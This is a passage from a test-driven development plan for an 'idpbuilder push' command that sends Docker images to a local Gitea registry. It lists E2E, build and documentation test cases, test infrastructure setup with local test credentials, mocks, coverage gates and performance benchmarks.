    // And: Exit code 4
    // And: Suggestion: "Run 'docker images'"
}
```

#### TC-E2E-EDGE-004: Multi-Architecture Image
```go
func TestE2E_MultiArchitectureImage(t *testing.T) {
    // Given: Multi-arch Docker image (amd64 + arm64)
    // When: Execute push
    // Then: Correct architecture pushed
    // And: Manifest list handled correctly
}
```

#### TC-E2E-EDGE-005: Tag Override in Image Name
```go
func TestE2E_TagOverrideInImageName(t *testing.T) {
    // Given: Local image "myapp:v1.0.0"
    // When: Execute: idpbuilder push myapp:v1.0.0 (explicit tag)
    // Then: Image pushed with tag "v1.0.0"
    // And: Tag not changed to "latest"
}
```

#### TC-E2E-EDGE-006: Concurrent Pushes
```go
func TestE2E_ConcurrentPushes(t *testing.T) {
    // Given: 3 different images
    // When: Execute 3 pushes concurrently (goroutines)
    // Then: All 3 pushes succeed
    // And: No race conditions or deadlocks
}
```

#### TC-E2E-EDGE-007: Flaky Test Detection
```go
func TestE2E_FlakyTestDetection(t *testing.T) {
    // Run each E2E test 10 times
    // When: Any test fails non-deterministically
    // Then: Flag as flaky and investigate
    // Target: <1% flaky test rate
}
```

**Wave 1 Test Success Criteria:**
- All E2E tests pass with real infrastructure
- Test Gitea registry in Docker
- Flaky test rate <1%
- Tests run in CI reliably

---

### PHASE 3, WAVE 2: Documentation & IDPBuilder Integration

**Test Deliverables:**
- Documentation validation tests
- Build system tests
- CI/CD integration tests

**Effort 3.2.1: User Documentation**

#### TC-DOC-001: Documentation Examples Execute Successfully
```go
func TestDocumentation_ExamplesExecute(t *testing.T) {
    // Given: All examples from docs/push-command.md
    // When: Execute each example command
    // Then: Each example works as documented
    // And: Output matches documentation
}
```

#### TC-DOC-002: Troubleshooting Guide Coverage
```go
func TestDocumentation_TroubleshootingCoverage(t *testing.T) {
    // Verify troubleshooting guide includes:
    // - Docker daemon not running
    // - Image not found
    // - Authentication failure
    // - TLS certificate errors
    // - Network connectivity issues
    // Each: Documented with solution
}
```

#### TC-DOC-003: README Examples Valid
```go
func TestDocumentation_READMEExamples(t *testing.T) {
    // Given: Examples in main README
    // When: Execute examples
    // Then: All examples work
    // And: Syntax highlighted correctly
}
```

**Effort 3.2.2: IDPBuilder Integration & Build System**

#### TC-BUILD-001: Make Build Includes Push Command
```go
func TestBuildSystem_MakeBuildIncludesPush(t *testing.T) {
    // When: Execute: make build
    // Then: Binary includes push command
    // And: Execute: ./idpbuilder push --help
    // Then: Help text displayed
}
```

#### TC-BUILD-002: Make Test Runs All Tests
```go
func TestBuildSystem_MakeTestRunsAll(t *testing.T) {
    // When: Execute: make test
    // Then: All unit tests run
    // And: All integration tests run
    // And: Coverage report generated
    // And: Coverage ≥80%
}
```

#### TC-BUILD-003: Go Mod Dependencies Correct
```go
func TestBuildSystem_GoModDependencies(t *testing.T) {
    // When: Inspect go.mod
    // Then: go-containerregistry included (v0.19.0)
    // And: docker/docker included (v24.0.0)
    // And: All dependencies have correct versions
    // And: No conflicting dependencies
}
```

#### TC-BUILD-004: CI Pipeline Updated
```go
func TestBuildSystem_CIPipelineUpdated(t *testing.T) {
    // When: CI pipeline runs
    // Then: Build succeeds
    // And: Unit tests run
    // And: Integration tests run
    // And: E2E tests run (with Docker)
    // And: Coverage reported
}
```

**Wave 2 Test Success Criteria:**
- Documentation examples all work
- Build system verified
- CI/CD pipeline updated

---

## 5. Test Infrastructure Requirements

### 5.1 Testing Tools & Frameworks

**Go Testing Stack:**
```go
// go.mod (test dependencies)
require (
    github.com/stretchr/testify v1.9.0      // Assertions and mocking
    github.com/testcontainers/testcontainers-go v0.26.0  // Docker test infrastructure
    github.com/docker/docker v24.0.0+incompatible         // Docker client for tests
)
```

**Test Utilities:**
- `testify/assert`: Assertions in tests
- `testify/mock`: Mocking interfaces
- `testify/suite`: Test suites with setup/teardown
- `testcontainers-go`: Gitea registry in Docker for E2E tests
- Coverage tools: `go test -cover -coverprofile`

### 5.2 Test Environment Setup

**Local Development:**
```bash
# Prerequisites
- Docker daemon running
- Go 1.21+ installed
- Network access for pulling Gitea image

# Run unit tests
make test-unit

# Run integration tests (requires Docker)
make test-integration

# Run E2E tests (requires Gitea container)
make test-e2e

# Generate coverage report
make coverage
```

**CI/CD Environment:**
```yaml
# GitHub Actions / GitLab CI setup
- name: Setup
  run: |
    # Start Docker daemon
    # Pull Gitea image
    # Build test images

- name: Run Tests
  run: |
    make test-unit
    make test-integration
    make test-e2e

- name: Coverage Report
  run: |
    make coverage
    # Upload to coverage service
```

### 5.3 Test Data & Fixtures

**Test Docker Images:**
```dockerfile
# test-fixtures/simple-image/Dockerfile
FROM alpine:latest
RUN echo "test" > /test.txt
CMD ["/bin/sh"]

# Build: docker build -t test-app:latest test-fixtures/simple-image
```

**Test Registry Setup:**
```bash
# Start Gitea registry for E2E tests
docker run -d --name gitea-test-registry \
  -p 8443:3000 \
  -e GITEA__security__INSTALL_LOCK=true \
  -e GITEA__repository__ENABLE_PUSH_CREATE_USER=true \
  gitea/gitea:latest

# Configure admin user
curl -X POST http://localhost:8443/api/v1/admin/users \
  -H "Content-Type: application/json" \
  -d '{"username":"giteaadmin","password":"admin123","email":"admin@test.com"}'
```

**Test Credentials:**
```go
// test/fixtures/credentials.go
const (
    TestUsername = "giteaadmin"
    TestPassword = "admin123"
    TestRegistry = "https://localhost:8443/"
)
```

### 5.4 Mock Implementations

**Docker Client Mock:**
```go
// pkg/docker/mock/client.go
type MockDockerClient struct {
    mock.Mock
}

func (m *MockDockerClient) ImageExists(ctx context.Context, imageName string) (bool, error) {
    args := m.Called(ctx, imageName)
    return args.Bool(0), args.Error(1)
}

// Similar for other interface methods
```

**Registry Client Mock:**
```go
// pkg/registry/mock/client.go
type MockRegistryClient struct {
    mock.Mock
}

func (m *MockRegistryClient) Push(ctx context.Context, image v1.Image, targetRef string, callback ProgressCallback) error {
    args := m.Called(ctx, image, targetRef, callback)
    // Simulate progress callbacks if provided
    return args.Error(0)
}
```

---

## 6. Test Execution Strategy

### 6.1 Test Execution by Phase

**Phase 1: Unit Tests Only**
```bash
# During Phase 1 Wave 2 implementation
cd pkg/docker && go test -v -cover
cd pkg/registry && go test -v -cover
cd pkg/auth && go test -v -cover
cd pkg/tls && go test -v -cover

# After Wave 2 integration
go test ./pkg/... -cover -coverprofile=coverage.out
go tool cover -html=coverage.out
```

**Phase 2: Unit + Integration Tests**
```bash
# Unit tests continue
go test ./pkg/... -cover

# Integration tests added
go test ./test/integration/... -v -tags=integration

# Command tests
go test ./cmd/... -cover
```

**Phase 3: Full Test Suite**
```bash
# All tests
make test-all

# Which runs:
# 1. Unit tests
# 2. Integration tests
# 3. E2E tests with Gitea
# 4. Performance benchmarks
```

### 6.2 Continuous Testing During Development

**TDD Workflow per Effort:**
```bash
# 1. Create test file first
touch pkg/docker/client_test.go

# 2. Write failing test
# (Edit client_test.go with test case from this plan)

# 3. Run test (should fail - RED)
go test ./pkg/docker -v

# 4. Implement minimal code to pass
# (Edit pkg/docker/client.go)

# 5. Run test (should pass - GREEN)
go test ./pkg/docker -v

# 6. Refactor with confidence
# Tests ensure no regression

# 7. Check coverage
go test ./pkg/docker -cover
```

### 6.3 Pre-Commit Test Gates

**Git Pre-Commit Hook:**
```bash
#!/bin/bash
# .git/hooks/pre-commit

echo "Running pre-commit tests..."

# Run unit tests for changed packages
CHANGED_PKGS=$(git diff --cached --name-only | grep '\.go$' | xargs -I {} dirname {} | sort -u)

for pkg in $CHANGED_PKGS; do
    echo "Testing: $pkg"
    go test ./$pkg/... || exit 1
done

# Check coverage
go test ./... -coverprofile=coverage.out
COVERAGE=$(go tool cover -func=coverage.out | grep total | awk '{print $3}' | sed 's/%//')

if (( $(echo "$COVERAGE < 85" | bc -l) )); then
    echo "Coverage $COVERAGE% is below 85% threshold"
    exit 1
fi

echo "Pre-commit tests passed!"
```

### 6.4 Test Parallelization

**Parallel Test Execution:**
```bash
# Run tests in parallel (Go default)
go test ./... -parallel=4

# For CI with more resources
go test ./... -parallel=8

# Integration tests may need sequential execution
go test ./test/integration/... -parallel=1
```

---

## 7. Acceptance Criteria by Phase

### Phase 1 Acceptance Criteria

**Test Coverage:**
- [ ] Unit tests written for all packages (docker, registry, auth, tls)
- [ ] Coverage ≥85% for each package
- [ ] All tests pass
- [ ] Mock implementations validate interface design

**Test Quality:**
- [ ] Tests use table-driven design where applicable
- [ ] Error paths explicitly tested
- [ ] Resource cleanup verified (defer, Close())
- [ ] No flaky tests

**Documentation:**
- [ ] Each test has clear Given/When/Then structure
- [ ] Test names describe scenario clearly
- [ ] Complex tests have explanatory comments

---

### Phase 2 Acceptance Criteria

**Test Coverage:**
- [ ] Command unit tests ≥85%
- [ ] Integration tests between components ≥80%
- [ ] All error scenarios tested
- [ ] Exit codes validated

**Test Quality:**
- [ ] Mocked dependencies isolated
- [ ] Flag combinations tested
- [ ] Environment variable precedence tested
- [ ] Error messages validated

**Workflow Validation:**
- [ ] Complete push workflow tested (mocked)
- [ ] Progress reporting tested
- [ ] All features functional in tests

---

### Phase 3 Acceptance Criteria

**Test Coverage:**
- [ ] E2E tests with real Gitea: 100% of critical paths
- [ ] Integration tests: 80% overall
- [ ] Performance benchmarks completed
- [ ] Documentation examples tested

**Test Quality:**
- [ ] E2E tests reliable (flaky rate <1%)
- [ ] Test infrastructure automated
- [ ] Teardown always executes
- [ ] Tests run in CI successfully

**Production Readiness:**
- [ ] All PRD requirements validated
- [ ] Performance targets met
- [ ] Error scenarios covered
- [ ] User documentation validated

---

## 8. Performance Testing Strategy

### 8.1 Performance Benchmarks

**Benchmark: Command Startup Time**
```go
func BenchmarkCommandStartup(b *testing.B) {
    for i := 0; i < b.N; i++ {
        // Measure time from CLI invocation to ready
        // Target: <500ms
    }
}
```

**Benchmark: Small Image Push (10MB)**
```go
func BenchmarkSmallImagePush(b *testing.B) {
    // Given: 10MB test image
    // Measure: Total push time
    // Target: <5 seconds (network-dependent)
}
```

**Benchmark: Large Image Push (100MB)**
```go
func BenchmarkLargeImagePush(b *testing.B) {
    // Given: 100MB test image
    // Measure: Total push time
    // Target: <30 seconds (network-dependent)
}
```

**Benchmark: Memory Footprint**
```go
func BenchmarkMemoryFootprint(b *testing.B) {
    // Measure: Peak memory during push
    // Target: <200MB
}
```

### 8.2 Performance Targets (from PRD)

| Metric | Target | Test Method |
|--------|--------|-------------|
| Command startup | <500ms | Benchmark with time measurement |
| Memory footprint | <200MB | Memory profiling during push |
| Small image (10MB) | <5s | Benchmark with local registry |
| Large image (100MB) | <30s | Benchmark with local registry |
| Progress reporting | Real-time | Measure callback latency |

### 8.3 Performance Test Execution

**Profiling:**
```bash
# CPU profiling
go test -cpuprofile=cpu.prof -bench=. ./test/benchmark/...
go tool pprof cpu.prof

# Memory profiling
go test -memprofile=mem.prof -bench=. ./test/benchmark/...
go tool pprof mem.prof

# Trace
go test -trace=trace.out ./test/benchmark/...
go tool trace trace.out
```

---

## 9. Test Maintenance & Evolution

### 9.1 Test Review Process

**Code Review Checklist for Tests:**
- [ ] Tests written BEFORE implementation (TDD compliance)
- [ ] Test names clearly describe scenario
- [ ] Given/When/Then structure followed
- [ ] Coverage meets target for effort
- [ ] No flaky tests detected
- [ ] Mocks properly isolated
- [ ] Resource cleanup verified
- [ ] Error paths tested

### 9.2 Test Refactoring

**When to Refactor Tests:**
- Test becomes flaky (non-deterministic failures)
- Test is slow (>1s for unit test)
- Test is hard to understand
- Test duplicates logic from another test
- Test mocks change frequently (brittle)

**How to Refactor:**
- Extract common setup to helper functions
- Use table-driven tests for similar scenarios
- Improve test isolation
- Add better error messages
- Reduce test scope (test smaller units)

### 9.3 Adding New Tests

**When Adding New Tests:**
- New feature added (Phase 4, future)
- Bug discovered (regression test)
- Edge case identified
- Performance regression detected

**Process:**
1. Design test case (document in test plan)
2. Write failing test
3. Implement fix/feature
4. Verify test passes
5. Update test plan documentation

---

## 10. Test Plan Compliance & Verification

### 10.1 R341 TDD Compliance Checklist

**Before Starting Implementation:**
- [x] Test plan created BEFORE any code (this document)
- [x] Test cases designed for all efforts
- [x] Test infrastructure identified
- [x] Acceptance criteria defined

**During Implementation:**
- [ ] Tests written BEFORE implementation code (per effort)
- [ ] TDD workflow followed (RED → GREEN → REFACTOR)
- [ ] Coverage targets met incrementally
- [ ] Test execution gates enforced

**After Implementation:**
- [ ] All test cases from plan implemented
- [ ] Coverage targets met (85%+ unit, 80%+ integration)
- [ ] All tests passing
- [ ] Performance targets met

### 10.2 Test Plan Updates

**This test plan is a living document:**
- Update when new test scenarios discovered
- Add lessons learned from failures
- Document flaky tests and resolutions
- Track coverage improvements

**Version Control:**
- Test plan changes require review
- Test plan updates committed with test changes
- Test plan version incremented on major changes

---

## 11. Success Metrics

### 11.1 Test Coverage Metrics

**Target Metrics:**
- Unit test coverage: ≥85% (Phase 1 & 2)
- Integration test coverage: ≥80% (Phase 2 & 3)
- Critical path coverage: ≥95% (Phase 3)
- Overall project coverage: ≥80%

**Measurement:**
```bash
# Generate coverage report
go test ./... -coverprofile=coverage.out
go tool cover -func=coverage.out

# HTML report
go tool cover -html=coverage.out -o coverage.html
```

### 11.2 Test Quality Metrics

**Target Metrics:**
- Flaky test rate: <1%
- Test execution time (unit): <10s total
- Test execution time (E2E): <5min total
- Test maintenance burden: <5% of development time

### 11.3 Bug Detection Metrics

**Effectiveness Metrics:**
- Bugs caught by tests before review: Target >90%
- Bugs caught in code review: Target <10%
- Bugs found in production: Target 0

---

## 12. Appendix: Test Examples

### 12.1 Example: Table-Driven Unit Test

```go
func TestDockerClient_ValidateImageName(t *testing.T) {
    tests := []struct {
        name      string
        imageName string
        wantErr   bool
        errMsg    string
    }{
        {
            name:      "valid simple name",
            imageName: "myapp:latest",
            wantErr:   false,
        },
        {
            name:      "valid with namespace",
            imageName: "namespace/myapp:v1.0.0",
            wantErr:   false,
        },
        {
            name:      "invalid empty",
            imageName: "",
            wantErr:   true,
            errMsg:    "image name cannot be empty",
        },
        {
            name:      "invalid special char",
            imageName: "my@pp:latest",
            wantErr:   true,
            errMsg:    "@ character not allowed",
        },
    }

    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            client := &DockerClient{}
            err := client.ValidateImageName(tt.imageName)

            if tt.wantErr {
                assert.Error(t, err)
                assert.Contains(t, err.Error(), tt.errMsg)
            } else {
                assert.NoError(t, err)
            }
        })
    }
}
```

### 12.2 Example: Integration Test with Mocks

```go
func TestPushCommand_Integration(t *testing.T) {
    // Setup mocks
    mockDocker := new(mock.MockDockerClient)
    mockRegistry := new(mock.MockRegistryClient)

    // Configure mock expectations
    mockDocker.On("ImageExists", mock.Anything, "myapp:latest").Return(true, nil)
    mockDocker.On("GetImage", mock.Anything, "myapp:latest").Return(testImage, nil)
    mockRegistry.On("Push", mock.Anything, testImage, mock.Anything, mock.Anything).Return(nil)

    // Execute command
    cmd := NewPushCommand(mockDocker, mockRegistry)
    err := cmd.Execute([]string{"myapp:latest", "--password", "pass"})

    // Verify
    assert.NoError(t, err)
    mockDocker.AssertExpectations(t)
    mockRegistry.AssertExpectations(t)
}
```

### 12.3 Example: E2E Test with Testcontainers

```go
func TestE2E_PushToGitea(t *testing.T) {
    ctx := context.Background()

    // Start Gitea container
    giteaContainer, err := testcontainers.GenericContainer(ctx, testcontainers.GenericContainerRequest{
        ContainerRequest: testcontainers.ContainerRequest{
            Image:        "gitea/gitea:latest",
            ExposedPorts: []string{"3000/tcp"},
            Env: map[string]string{
                "GITEA__security__INSTALL_LOCK": "true",
            },
        },
        Started: true,
    })
    require.NoError(t, err)
    defer giteaContainer.Terminate(ctx)

    // Get registry endpoint
    endpoint, err := giteaContainer.Endpoint(ctx, "")
    require.NoError(t, err)

    // Execute push command
    cmd := exec.Command("idpbuilder", "push", "test-app:latest",
        "--registry", endpoint,
        "--username", "giteaadmin",
        "--password", "admin123",
        "--insecure")

    output, err := cmd.CombinedOutput()

    // Verify
    assert.NoError(t, err)
    assert.Contains(t, string(output), "Successfully pushed")

    // Verify image in registry via API
    // ... (registry API verification code)
}
```

---

## 13. Document Status

**Status:** APPROVED FOR IMPLEMENTATION
**Author:** Code Reviewer Agent (@agent-code-reviewer)
**Created:** 2025-10-29
**Version:** v1.0
**Compliance:** R341 TDD Requirements

**R341 Compliance Verified:**
- ✅ All test scenarios designed BEFORE implementation
- ✅ Test cases cover all phases, waves, and efforts
- ✅ Tests support parallel development strategy
- ✅ Incremental test execution after each wave
- ✅ Clear acceptance criteria per phase

**Ready for:**
- Phase 1 Wave 1 implementation (with TDD)
- Test infrastructure setup
- CI/CD integration

**Next Steps:**
1. Orchestrator spawns SW Engineers for Phase 1 Wave 1
2. SW Engineers read this test plan for their effort
3. SW Engineers write tests FIRST (TDD compliance)
4. SW Engineers implement to pass tests
5. Code Reviewer validates test coverage in reviews

---

**END OF TEST PLAN**
